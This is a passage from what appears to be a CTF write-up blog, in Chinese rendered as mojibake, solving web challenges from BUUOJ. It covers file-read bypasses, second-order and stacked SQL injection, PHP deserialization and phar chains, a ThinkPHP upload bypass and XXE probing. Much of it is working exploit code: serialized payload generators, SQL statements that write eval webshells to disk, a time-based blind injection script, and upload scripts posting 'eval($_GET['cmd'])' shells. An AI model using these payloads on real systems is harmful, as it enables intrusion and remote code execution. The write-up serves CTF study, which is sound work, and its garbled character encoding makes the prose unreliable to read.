(preg_match(\"/$blacklist/is\", $string)) {\n        Hacker();\n    }\n    if (is_string($string)) {\n        return $mysqli->real_escape_string($string);\n    } else {\n        return \"\";\n    }\n}\n\nfunction sql_query($sql_query)\n{\n    global $mysqli;\n    $res = $mysqli->query($sql_query);\n    return $res;\n}\n\nfunction login($user, $pass)\n{\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'\";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n    if ($res->num_rows) {\n        $data = $res->fetch_array();\n        $_SESSION['user'] = $data[username_which_you_do_not_know];\n        $_SESSION['login'] = 1;\n        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction updateadmin($level,$user)\n{\n    $sql = \"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' \";\n    echo $sql;\n    $res = sql_query($sql);\n//    var_dump($res);\n//    die();\n//    die($res);\n    if ($res == 1) {\n        return true;\n    } else {\n        return false;\n    }\n    return;\n}\n\nfunction register($user, $pass)\n{\n    global $mysqli;\n    $user = Filter($user);\n    $pass = md5($pass);\n    $sql = \"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')\";\n    $res = sql_query($sql);\n    return $mysqli->insert_id;\n}\n\nfunction logout()\n{\n    session_destroy();\n    Header(\"Location: index.php\");\n}\n\n?>\n```\n\næŸ¥çœ‹ffffllllaaaagggï¼Œå‘ç°è¢«è¿‡æ»¤äº†\n`/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg`\nä½†æ˜¯parse_urlè§£ææ¼æ´ï¼Œå½“urlç§å‡ºç°ä¸‹é¢è¿™ç§æƒ…å†µçš„urlï¼Œä¼šè§£æé”™è¯¯ï¼Œè¿”å›false\n`//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg`\nè¯»å–åˆ°è¿™ä¸ªæ–‡ä»¶äº†\n\n```\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}else {\n    echo \"you can find sth in m4aaannngggeee\";\n}\n?>\n```\n\nç»§ç»­æŸ¥çœ‹m4aaannngggeee\n\n```\n<?php\nif (FLAG_SIG != 1){\n    die(\"you can not visit it directly\");\n}\ninclude \"templates/upload.html\";\n\n?>\n```\n\nå»çœ‹çœ‹upload.htmlï¼Œå†è½¬å›upllloadddd.php\n\n```php\n//upllloadddd.php\n<?php\n$newfile = $path.$filename;\necho \"file upload success<br />\";\necho $filename;\n$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");\necho \"<img src='data:image/png;base64,\".$picdata.\"'></img>\";\n?>\n\n```\n\nåœ¨è¿™æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥ä¿®æ”¹æ–‡ä»¶åå°±èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011611789.png)\n\n## [FireshellCTF2020]Caas\n\nè¯•äº†è¯•phpå’Œpythonä»£ç ï¼Œéƒ½ç¼–è¯‘å¤±è´¥ï¼Œå„ç§ç¼–ç¨‹è¯­è¨€éƒ½å°è¯•ä¸€ä¸‹å‘ç°æ˜¯Cçš„ç¼–è¯‘å™¨ï¼Œä½ å¥½ä¸–ç•Œè¯•è¯•\n\n```C\n#include <stdio.h>\nint main() {\n    printf(\"Hello, World! \\n\");\n    return 0;\n}\n```\n\nçœ‹wpçŸ¥é“æ˜¯å¤´æ–‡ä»¶åŒ…å«æŠ¥é”™ï¼Œè¯•è¯•/etc/passwdï¼Œæœ‰å›æ˜¾\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011632778.png)\n\nç›´æ¥åŒ…å«flagæ‹¿åˆ°\n\n## October 2019 Twice SQL Injection\n\né¢˜ç›®åå­—å¾ˆæ˜æ˜¾äº†ï¼ŒäºŒæ¬¡æ³¨å…¥ï¼Œæ³¨å…¥ç‚¹åœ¨usernameå¤„\n\n```\nkkk' union select database() #\n\nrua' union select group_concat(table_name) from information_schema.tables where table_schema='ctftraining' #\n\nkkk' union select group_concat(column_name) from information_schema.columns where table_name='flag'#\n\nkkk' union select flag from flag #\n```\n\nåšå®Œå¯ä»¥çœ‹çœ‹æºç è¯­å¥è¢«æ„é€ æˆäº†ä»€ä¹ˆæ ·\n\n```php\næ’å…¥\nif (isset($_POST['username']) && $_POST['username'] != \"\") {\n\t$username = addslashes($_POST['username']);\n\t$password = md5($_POST['password']);\n\tif (mysql_query(\"insert into users(username,password,info) values ('{$username}','{$password}','åæœˆå¤ªæ‡’ï¼Œæ²¡æœ‰ç®€ä»‹');\")) {\n\t\t\theader(\"Location: /?action=login\");\n}\nå–å‡º\n$info = query(\"select info from users where username='{$_SESSION['username']}';\");\n```\n\nå¯ä»¥çœ‹åˆ°ä»æ•°æ®åº“ä¸­å–å‡ºinfoæ•°æ®çš„æ—¶å€™å¹¶æ²¡æœ‰å¯¹usernameè¿›è¡Œaddslashå¤„ç†ï¼Œä¼šå¯¼è‡´æŸ¥è¯¢çš„æ˜¯kkkè¿™ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬å¹¶æ²¡æœ‰æ³¨å†Œè¿‡è¿™ä¸ªç”¨æˆ·ï¼Œå¯¼è‡´åé¢çš„union selectæ‰§è¡Œï¼Œäº§ç”Ÿäº†äºŒæ¬¡æ³¨å…¥æ¼æ´\n\n## [EIS 2019]EzPOP\n\nä¸Šæ¥å°±ç»™äº†æºç ï¼Œä¸é”™~~ä¸é”™ä¸ªæ¯›çº¿å•Šmdè¿™ä»€ä¹ˆç©æ„å•Šï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼~~\n\n```php\n<?php\nerror_reporting(0);\n\nclass A {\n    protected $store;\n    protected $key;\n    protected $expire;\n    public function __construct($store, $key = 'flysystem', $expire = null) {\n        $this->key = $key;\n        $this->store = $store;\n        $this->expire = $expire;\n    }\n    public function cleanContents(array $contents) {\n        $cachedProperties = array_flip([\n            'path', 'dirname', 'basename', 'extension', 'filename',\n            'size', 'mimetype', 'visibility', 'timestamp', 'type',\n        ]);//è¿™ä¸ªå‡½æ•°åè½¬æ•°ç»„ä¸­æ‰€æœ‰çš„é”®ä»¥åŠå®ƒä»¬å…³è”çš„å€¼ï¼ŒåŸæ¥æ˜¯1->pathï¼Œç°åœ¨æ˜¯path->1\n        foreach ($contents as $path => $object) {\n            if (is_array($object)) {\n                $contents[$path] = array_intersect_key($object, $cachedProperties);//æ­¤å¤„æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„çš„é”®åï¼Œå¹¶è¿”å›äº¤é›†\n            }\n        }\n        return $contents;\n    }\n    public function getForStorage() {\n        $cleaned = $this->cleanContents($this->cache);//ä¼ å…¥äº†cacheå˜é‡ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œå‘ç°å¹¶æ²¡æœ‰cacheè¿™ä¸ªå˜é‡ï¼Œæ‰€ä»¥è¿™ä¸ªéœ€è¦åç»­æŠŠå˜é‡å®šä¹‰ä¼ å€¼\n        return json_encode([$cleaned, $this->complete]);//çœ‹åˆ°è¿”å›å€¼è¢«json_encode\n    }\n    public function save() {\n        $contents = $this->getForStorage();ã€\n        $this->store->set($this->key, $contents, $this->expire);//è¿™é‡Œsetå‡½æ•°åœ¨Bç±»ä¸­å­˜åœ¨ï¼Œåˆ°åé¢å†å®¡è®¡\n    }\n    public function __destruct() {//æ˜æ˜¾è¿™é‡Œå°±æ˜¯ååºåˆ—åŒ–å¤´äº†\n        if (!$this->autosave) {\n            $this->save();\n        }\n    }\n}\nclass B {\n    protected function getExpireTime($expire): int {//è¿™è¾¹è¿”å›çš„æ˜¯intå‚æ•°\n        return (int) $expire;\n    }\n    public function getCacheKey(string $name): string {//æ‹¼æ¥å­—ç¬¦ä¸²\n        return $this->options['prefix'] . $name;\n    }\n    protected function serialize($data): string {//åæ­£å°±æ˜¯æŠŠæ‰€æœ‰å†…å®¹ç»è¿‡options['serialize']åç§°å‡½æ•°è½¬æ¢äº†\n        if (is_numeric($data)) {\n            return (string) $data;\n        }\n        $serialize = $this->options['serialize'];\n        return $serialize($data);\n    }\n    public function set($name, $value, $expire = null): bool{\n        $this->writeTimes++;\n        if (is_null($expire)) {//è¿™è¾¹$expireå¯æ§ï¼Œç›´æ¥énull\n            $expire = $this->options['expire'];\n        }\n        $expire = $this->getExpireTime($expire);//è½¬intç±»å‹\n        $filename = $this->getCacheKey($name);//è¿™é‡Œä¼šæŠŠå†…å®¹å˜æˆ$this->options['prefix'].$name\n        $dir = dirname($filename);//æŠŠå¦‚/var/www/html/index.phpçš„å­—ç¬¦ä¸²è½¬ä¸º/var/www/htmlè¿™æ ·\n        if (!is_dir($dir)) {\n            try {\n                mkdir($dir, 0755, true);\n            } catch (\\Exception $e) {\n                // åˆ›å»ºå¤±è´¥\n            }\n        }\n        $data = $this->serialize($value);//æŠŠä¼ å…¥çš„$valueè½¬ä¸ºå­—ç¬¦ä¸²\n        if ($this->options['data_compress'] && function_exists('gzcompress')) {\n            //æ•°æ®å‹ç¼©ï¼Œç›´æ¥options['data_compress']=0ç»•è¿‡\n            $data = gzcompress($data, 3);\n        }\n        $data = \"<?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?>\\n\" . $data;//è¿™é‡Œéœ€è¦ç»•è¿‡æ­»äº¡exit\n        $result = file_put_contents($filename, $data);//è¿™å¾ˆæ˜æ˜¾å†™shelläº†\n        if ($result) {\n            return true;\n        }\n        return false;\n    }\n}\n\nif (isset($_GET['src']))\n{\n    highlight_file(__FILE__);\n}\n\n$dir = \"uploads/\";\n\nif (!is_dir($dir))\n{\n    mkdir($dir);\n}\nunserialize($_GET[\"data\"]);\n```\n\nå†™ä¸€ä¸‹ç»•è¿‡æ­»äº¡exitçš„æ–¹æ³•ï¼Œä½¿ç”¨base64è§£ç `<?php\\n//\" . sprintf('%012d', $expire) . \"\\n exit();?>\\n`è¿™ä¸ªå­—ç¬¦ä¸²ä¸­çœŸæ­£ä¼šè¢«base64è§£ç è¯†åˆ«åˆ°çš„å†…å®¹å®é™…ä¸Šæ˜¯`php12ä½é•¿åº¦çš„æ•°å­—exit`è€Œbase64åˆæ˜¯ä»¥4ä¸ªå­—èŠ‚ä¸ºä¸€ç»„æ¥è¿›è¡Œè§£ç çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬dataä¸­çš„å†…å®¹å°±æ˜¯éšä¾¿ä¸€ä¸ªå•å­—ç¬¦åŠ ä¸Šä¸€å¥è¯æœ¨é©¬base64ç¼–ç åçš„å†…å®¹å³å¯\n\næœ€ç»ˆæ„é€ å‡ºçš„é“¾å­å°±æ˜¯è§¦å‘Aç±»é”€æ¯å¼•å¯¼Bç±»setå‡½æ•°æ‰§è¡Œ\n\n```php\n//exp.php\n<?php\nerror_reporting(0);\n\nclass A {\n    protected $store;\n    protected $key;//æ–‡ä»¶çš„name\n    protected $expire;//æ— æ‰€è°“å…¶å®\n    public function __construct()\n    {\n        $this->cache = array();\n        $this->complete = base64_encode(\"xxx\".base64_encode('<?php @eval($_POST[\"kkk\"]);?>'));\n        $this->key = \"shell.php\";\n        $this->store = new B();\n        $this->autosave = false;\n        $this->expire = 0;\n    }\n}\nclass B {\n    public $options = array();\n    function __construct()\n    {\n        $this->options['serialize'] = 'base64_decode';\n        $this->options['prefix'] = 'php://filter/write=convert.base64-decode/resource=';\n        $this->options['data_compress'] = false;\n    }\n}\nprint(urlencode(serialize(new A)));\n```\n\n## [WMCTF2020]Make PHP Great Again\n\nPHPæœ€æ–°ç‰ˆçš„å°Trickï¼Œ require_onceåŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šæ—¶onceçš„hashåŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«\n\n## [æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp\n\nå…ˆæ‰”ä¸€ä¸ªexp\n\n```\n<?php\nerror_reporting(0);\nclass SYCLOVER {\n    public $syc;\n    public $lover;\n\n}\n\n$str = \"?><?=include~\".urldecode(\"%d0%99%93%9e%98\").\"?>\";\n$a=new Error($str,1);$b=new Error($str,2);\n$c = new SYCLOVER();\n$c->syc = $a;\n$c->lover = $b;\necho urlencode(serialize($c));\n?>\n\n```\n\n\n\n\n\n\n\n\n\n\n\n## [SUCTF 2018]MultiSQL\n\næ³¨å†Œç™»å½•ï¼Œåœ¨å¤´åƒå¤„ä¼¼ä¹æœ‰æ–‡ä»¶ä¸Šä¼ \n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020934705.png)\n\nä¸Šä¼ åå‘ç°ä»»ä½•æ–‡ä»¶éƒ½è¢«é‡å‘½åä¸ºjpgæ ¼å¼\n\nç”¨æˆ·ä¿¡æ¯å¤„æœ‰sqlæ³¨å…¥ç‚¹ï¼Œå¯ä½¿ç”¨å †å æ³¨å…¥\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020935563.png)\n\nè¿‡æ»¤äº†å¤§é‡å…³é”®å­—ï¼Œç”¨è®¾å®šè¯­å¥å˜é‡ç»•è¿‡\n\n```\nstr=\"select '<?php eval($_POST[kkk]);?>' into outfile '/var/www/html/favicon/shell.php';\"\nlen_str=len(str)\nfor i in range(0,len_str):\n\tif i == 0:\n\t\tprint('char(%s'%ord(str[i]),end=\"\")\n\telse:\n\t\tprint(',%s'%ord(str[i]),end=\"\")\nprint(')')\n```\n\næ„é€ å†™shell payloadå¦‚ä¸‹\n\n```\n2;set @a=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,107,107,107,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @a;execute query;\n```\n\nRCEæ‹¿flag\n\n## [SWPU2019]Web4\n\nSQLæ³¨å…¥ï¼Œåœ¨usernameå¤„æ”¾å…¥å•å¼•å·æŠ¥é”™ï¼Œä½†æ˜¯å†åŠ ä¸Š;å°±èƒ½æ‰§è¡Œï¼Œè¯´æ˜å­˜åœ¨å †å æ³¨å…¥ï¼Œå…ˆæ„é€ å†™shellè¯­å¥å‘ç°æ— æ³•å†™å…¥ï¼Œæ‰€ä»¥æ„é€ å¸ƒå°”æ³¨å…¥è¯­å¥\n\n```python\nimport requests, time\nimport json\n\n\ndef str_to_hex(strings):\n    by = bytes(strings, 'UTF-8')  # å…ˆå°†è¾“å…¥çš„å­—ç¬¦ä¸²è½¬åŒ–æˆå­—èŠ‚ç \n    hexstring = by.hex()\n    return hexstring\nurl = \"http://b28f3ae7-5844-4587-9d21-69687f9fc61d.node4.buuoj.cn:81/index.php?r=Login/Login\"\nflag = \"\"\nfor i in range(1, 100):\n    low = 32\n    high = 128\n    mid = (low + high) // 2\n    while low < high:\n        payload = \"select if(ascii(substr((select flag from flag),{},1))>{},sleep(2),0)\".format(i, mid)\n        zpayload = \"1';set @a=0x{};prepare b from @a;execute b;\".format(str_to_hex(payload))\n        data = {\n            'username': zpayload,\n            'password': '111'\n        }\n        datas = json.dumps(data)\n        time1 = time.time()\n        r = requests.post(url, data=datas)\n        time2 = time.time()\n        times = time2 - time1\n        if times > 2:\n            low = mid + 1\n        else:\n            high = mid\n        mid = (low + high) // 2\n        print(low, mid, high, times)\n    flag += chr(mid)\n    print(flag)\n    if mid == 32:\n        break\n```\n\nè·‘å‡ºä¸€ä¸ªæ–‡ä»¶åï¼Œä¸‹è½½æŸ¥çœ‹\n\n```php\n///Common/fun.php\n// è·¯ç”±æ§åˆ¶è·³è½¬è‡³æ§åˆ¶å™¨\nif(!empty($_REQUEST['r']))\n{\n\t$r = explode('/', $_REQUEST['r']);\n\tlist($controller,$action) = $r;\n\t$controller = \"{$controller}Controller\";\n\t$action = \"action{$action}\";\n\tif(class_exists($controller))\n\t{\n\t\tif(method_exists($controller,$action))\n\t\t{\n\t\t\t//\n\t\t}\n\t\telse\n\t\t{\n\t\t\t$action = \"actionIndex\";\n\t\t}\n\t}\n\telse\n\t{\n\t\t$controller = \"LoginController\";\n        $action = \"actionIndex\";\n\t}\n    $data = call_user_func(array( (new $controller), $action));\n} else {\n    header(\"Location:index.php?r=Login/Index\");\n}\n\n```\n\n```php\n/Controller/BaseController\n<?php \n//æ‰€æœ‰æ§åˆ¶å™¨çš„çˆ¶ç±»\nclass BaseController\n{\n\t/*\n\t * åŠ è½½è§†å›¾æ–‡ä»¶\n\t * viewName è§†å›¾åç§°\n\t * viewData è§†å›¾åˆ†é…æ•°æ®\n\t*/\n\tprivate $viewPath;\n\tpublic function loadView($viewName ='', $viewData = [])\n\t{\n\t\t$this->viewPath = BASE_PATH . \"/View/{$viewName}.php\";\n\t\tif(file_exists($this->viewPath))\n\t\t{\n\t\t\textract($viewData);//å°†æ•°ç»„ä¸­çš„å†…å®¹å˜ä¸ºå˜é‡\n\t\t\tinclude $this->viewPath;//åŒ…å«æ¸²æŸ“æ¨¡ç‰ˆ\n\t\t}\n\t}\n}\n```\n\n```php\n///View/userIndex\n<?php\n\tif(!isset($img_file)) {\n\t\t$img_file = '/../favicon.ico';\n\t}\n\t$img_dir = dirname(__FILE__) . $img_file;\n\t$img_base64 = imgToBase64($img_dir);\n\techo '<img src=\"' . $img_base64 . '\">';       //ä»»æ„æ–‡ä»¶base64ç¼–ç \n?>\n```\n\nå®¡è®¡å®Œpayloadå°±å‡ºæ¥äº†\n\n```\n?r=User/Index&img_file=/../flag.php\n```\n\nå›¾ç‰‡å¤„è¯»base64è§£ç å³å¯\n\n## [GXYCTF2019]BabysqliV3.0\n\næˆ‘tmè¯•äº†åŠå¤©ä½ å‘Šè¯‰æˆ‘å¼±å£ä»¤ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ/\n\n`admin/password`\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206021103197.png)\n\næ˜æ˜¾çš„æ–‡ä»¶è¯»å–ï¼Œä¼ªåè®®è¯»å–\n\n```php\n//upload.php\n<?php\nerror_reporting(0);\nclass Uploader{\n        public $Filename;\n        public $cmd;\n        public $token;\n        function __construct(){\n                $sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\";\n                $ext = \".txt\";\n                @mkdir($sandbox, 0777, true);\n                if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n                        $this->Filename = $_GET['name'];\n                }\n                else{\n                        $this->Filename = $sandbox.$_SESSION['user'].$ext;\n                }\n                $this->cmd = \"echo '<br><br>Master, I want to study rizhan!<br><br>';\";\n                $this->token = $_SESSION['user'];\n        }\n        function upload($file){\n                global $sandbox;\n                global $ext;\n                if(preg_match(\"[^a-z0-9]\", $this->Filename)){\n                        $this->cmd = \"die('illegal filename!');\";\n                }\n                else{\n                        if($file['size'] > 1024){\n                                $this->cmd = \"die('you are too big (â€²â–½`ã€ƒ)');\";\n                        }\n                        else{\n                                $this->cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this->Filename . \"');\";\n                        }\n                }\n        }\n        function __toString(){\n                global $sandbox;\n                global $ext;\n                // return $sandbox.$this->Filename.$ext;\n                return $this->Filename;\n        }\n        function __destruct(){\n                if($this->token != $_SESSION['user']){\n                        $this->cmd = \"die('check token falied!');\";\n                }\n                eval($this->cmd);\n        }\n}\nif(isset($_FILES['file'])) {\n        $uploader = new Uploader();\n        $uploader->upload($_FILES[\"file\"]);\n        if(@file_get_contents($uploader)){\n                echo \"ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š<br>\".$uploader.\"<br>\";\n                echo file_get_contents($uploader);\n        }\n}\n?>\n```\n\næ­¤å¤„æœ‰ä¸€ä¸ªfile_get_contentså­˜åœ¨pharååºåˆ—åŒ–ï¼Œä»»æ„ä¸Šä¼ æ–‡ä»¶å¯ä»¥æ‹¿åˆ°`$_SESSION['user']`ï¼Œç„¶åæ„é€ exp\n\n```php\n<?php\nerror_reporting(0);\nclass Uploader{\n    public $Filename;\n    public $cmd;\n    public $token;\n}\n$upload=new Uploader();\n$upload->cmd = \"highlight_file('/var/www/html/flag.php');\";\n$upload->token = 'GXY380513e563f39abb95bd589a6d2648ec';\n$phar = new Phar(\"phar.phar\");\n$phar -> startBuffering();\n$phar -> setStub(\"<?php __HALT_COMPILER();?>\");\n$phar -> setMetadata($upload);\n$phar->addFromString(\"test.txt\", \"test\");\n$phar -> stopBuffering();\n?>\n```\n\nä¸Šä¼ åå°†nameå‚æ•°æ”¹ä¸º`phar:///var/www/html/uploads/da3fd6a2cf9c6007bda4c8a58e394ba2/GXY380513e563f39abb95bd589a6d2648ec.txt`åˆ·æ–°å³å¯æ‹¿flag\n\n## [SUCTF 2018]annonymous\n\næºç \n\n```php\n<?php\n$MY = create_function(\"\",\"die(`cat flag.php`);\");//åˆ›å»ºæ— åå‡½æ•°\n$hash = bin2hex(openssl_random_pseudo_bytes(32));//ç”Ÿæˆéšæœºæ•°\neval(\"function SUCTF_$hash(){\"\n    .\"global \\$MY;\"\n    .\"\\$MY();\"\n    .\"}\");//ç»™äº†æ— åå‡½æ•°ä¸€ä¸ªåå­—ï¼Œä½†æ˜¯æ˜¯éšæœºçš„\nif(isset($_GET['func_name'])){\n    $_GET[\"func_name\"]();\n    die();\n}\nshow_source(__FILE__);\n```\n\n> åŒ¿åå‡½æ•°å…¶å®æ˜¯æœ‰çœŸæ­£çš„åå­—ï¼Œä¸º%00lambda_%d(%dæ ¼å¼åŒ–ä¸ºå½“å‰è¿›ç¨‹çš„ç¬¬nä¸ªåŒ¿åå‡½æ•°,nçš„èŒƒå›´0-999)\n\né€šè¿‡ä¸Šé¢è¿™ä¸ªæ–¹æ³•ï¼Œç”¨ä¸ªè„šæœ¬å°±èƒ½è·‘å‡ºæ¥\n\n```python\nimport requests\nfor i in range(1,1000):\n    r=requests.get(url=f'http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/?func_name=%00lambda_{i}')\n    print(r.status_code)\n    if 'flag' in r.text:\n        print(r.text)\n        break\n```\n\n## [RoarCTF 2019]Simple Upload\n\n\n\n\n\n```php\n<?php \nnamespace Home\\Controller; \n\nuse Think\\Controller; \n\nclass IndexController extends Controller \n{ \n    public function index() \n    { \n        show_source(__FILE__); \n    } \n    public function upload() \n    { \n        $uploadFile = $_FILES['file'] ; \n         \n        if (strstr(strtolower($uploadFile['name']), \".php\") ) { \n            return false; \n        } \n         \n        $upload = new \\Think\\Upload();// å®ä¾‹åŒ–ä¸Šä¼ ç±» \n        $upload->maxSize  = 4096 ;// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å° \n        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹ \n        $upload->rootPath = './Public/Uploads/';// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½• \n        $upload->savePath = '';// è®¾ç½®é™„ä»¶ä¸Šä¼ å­ç›®å½• \n        $info = $upload->upload() ; \n        if(!$info) {// ä¸Šä¼ é”™è¯¯æç¤ºé”™è¯¯ä¿¡æ¯ \n          $this->error($upload->getError()); \n          return; \n        }else{// ä¸Šä¼ æˆåŠŸ è·å–ä¸Šä¼ æ–‡ä»¶ä¿¡æ¯ \n          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ; \n          echo json_encode(array(\"url\"=>$url,\"success\"=>1)); \n        } \n    } \n}\n```\n\n1ã€çœ‹æºç å¯ä»¥çœ‹å‡ºæ¥æ˜¯thinkphpçš„æ–‡ä»¶ä¸Šä¼ ï¼Œä»£ç ä¸­è¿‡æ»¤äº†phpæ–‡ä»¶åç¼€ï¼Œè€Œåœ¨thinkphpä¸­æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ä¼šå¯¹æ–‡ä»¶åè¿›è¡Œè¿™æ ·çš„å¤„ç†\n\n```php\nforeach ($files as $key => $file) {\n    $file['name']  = strip_tags($file['name']);//è¿™é‡Œå°†<>æ ‡ç­¾åˆ æ‰\n\t\tif(!isset($file['key']))   $file['key']    =   $key;\n\t\t/* é€šè¿‡æ‰©å±•è·å–æ–‡ä»¶ç±»å‹ï¼Œå¯è§£å†³FLASHä¸Šä¼ $FILESæ•°ç»„è¿”å›æ–‡ä»¶ç±»å‹é”™è¯¯çš„é—®é¢˜ */\n    if(isset($finfo)){\n        $file['type']   =   finfo_file ( $finfo ,  $file['tmp_name'] );\n    }\n```\n\næ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹çš„payload\n\n```python\nimport  requests\nurl = \"http://bb841c48-16f0-4700-a630-f8a44d9cfced.node4.buuoj.cn:81/index.php/home/index/upload\"\nfiles={'file':('1.<>php',\"<?php eval($_GET['cmd'])?>\")}\nr=requests.post(url=url,files=files)\nprint(r.text)\n```\n\n2ã€think PHPé‡Œçš„upload()å‡½æ•°åœ¨ä¸ä¼ å‚çš„æƒ…å†µä¸‹æ˜¯æ‰¹é‡ä¸Šä¼ çš„ï¼Œæ‰€ä»¥å¦‚æœä¸Šä¼ å¤šä¸ªæ–‡ä»¶\n\n```php\n$uploadFile = $_FILES['file'] ;\n\tif (strstr(strtolower($uploadFile['name']), \".php\") ) {\n  \treturn false;\n  }\n```\n\næ­¤å¤„nameå³ä¸ºæ•°ç»„ï¼Œå¯ç›´æ¥ç»•è¿‡\n\n```python\nimport  requests\nurl = \"http://f2d454a6-807f-4da4-9815-e366f39612d8.node4.buuoj.cn:81/index.php/home/index/upload\"\nfiles = {'file':(\"1.txt\",\"\")}\nfiles2={'file[]':('1.php',\"<?php eval($_GET['cmd'])?>\")}\nr = requests.post(url,files = files)\nprint (r.text)\nr = requests.post(url,files = files2)\nprint (r.text)\nr = requests.post(url,files = files)\nprint (r.text)\n```\n\nç»§ç»­å¾€ä¸‹èµ°ï¼Œå‘ç°è™½ç„¶phpæ–‡ä»¶ç¡®å®ä¸Šä¼ æˆåŠŸäº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è¿”å›æ–‡ä»¶åï¼Œçœ‹å‰åä¸¤ä¸ªæ–‡ä»¶é‡å‘½ååçš„å†…å®¹å‘ç°æ–‡ä»¶åçš„ç”Ÿæˆæ˜¯æœ‰è§„å¾‹çš„ï¼Œäº†è§£åçŸ¥é“æ–‡ä»¶åæ˜¯é€šè¿‡uniqidå¾—åˆ°çš„ï¼Œè¿™æ˜¯æ ¹æ®å½“å‰æ—¶é—´æ¥å¾—åˆ°çš„éšæœºæ•°ï¼Œé‚£ä¹ˆæ ¹æ®å‰åä¸¤ä¸ªæ–‡ä»¶åä¸åŒçš„ä½ç½®è¿›è¡Œçˆ†ç ´å³å¯\n\n## [GoogleCTF2019 Quals]Bnv\n\né€‰æ‹©åŸå¸‚å¹¶ä¸”è¿›è¡Œsubmitæ—¶ä¼šå‘apiå‘é€ä¸€ä¸ªjsonæ ¼å¼çš„postè¯·æ±‚ï¼Œè¿™é‡Œå…¶å®å°±æœ‰å¯èƒ½å­˜åœ¨XXEæ³¨å…¥\n\nåœ¨burpä¸­å°è¯•é€šè¿‡xmlæ–¹å¼ä¼ å…¥åŸå§‹æ•°æ®ï¼Œæç¤ºæœªå‘ç°<æ ‡ç­¾\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061819430.png)\n\næŒ‰ç…§xmlæ ¼å¼æ„é€ å†…å®¹æç¤ºæ²¡æœ‰DTD\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061821510.png)\n\né‚£æˆ‘ä»¬åœ¨æ”¾ä¸€ä¸ªDTDè¿›å»ï¼Œæç¤ºæœ‰æœªå£°æ˜çš„å…ƒç´ æ¶ˆæ¯\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061823346.png)\n\næ­¤å¤„ç±»ä¼¼äºåœ¨ä½¿ç”¨å˜é‡å‰è¦å…ˆå¯¹å˜é‡è¿›è¡Œå£°æ˜ï¼Œæˆ‘ä»¬åªéœ€è¦å£°æ˜ä¸€ä¸‹messageå…ƒç´ å³å¯ï¼Œæ­¤æ—¶å›æ˜¾æ­£å¸¸\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061829146.png)\n\né‚£ä¹ˆä¸‹ä¸€æ­¥æˆ‘ä»¬å°±è¦æƒ³å¦‚ä½•æ„é€ æ‰èƒ½è®©flagå›æ˜¾ï¼Œæˆ‘ä»¬å…ˆçœ‹æ˜¯å¦èƒ½è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæç¤ºæ–‡ä»¶è™½ç„¶å­˜åœ¨ä½†å¹¶ä¸æ˜¯ä¸€ä¸ªæ ¼å¼è‰¯å¥½çš„xmlæ–‡ä»¶ï¼Œæ‰€ä»¥åŠ è½½ä¸­æ–­äº†ï¼Œå°†/flagä¼ 